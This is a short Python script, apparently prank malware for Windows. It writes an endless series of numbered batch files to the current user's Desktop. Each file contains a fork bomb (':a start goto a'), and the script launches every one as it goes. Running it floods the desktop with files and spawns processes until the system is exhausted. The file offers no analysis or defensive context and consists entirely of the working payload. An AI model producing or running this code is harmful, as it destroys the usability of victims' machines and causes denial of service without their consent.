import subprocess
import getpass
import os

username = getpass.getuser()
userid ="C:\\Users\\"
cdrive ="C:\\"

def CSIdesk():
    desktop = (R"\Desktop\\")
    total = str(userid) + str(username) + str(desktop)
    if os.path.exists(total):
        x = 0
        while True:
            x = x + 1
            f = open((str(total)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                        """)
            f.close
            subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
    else:
        print("Code: 43")

CSIdesk()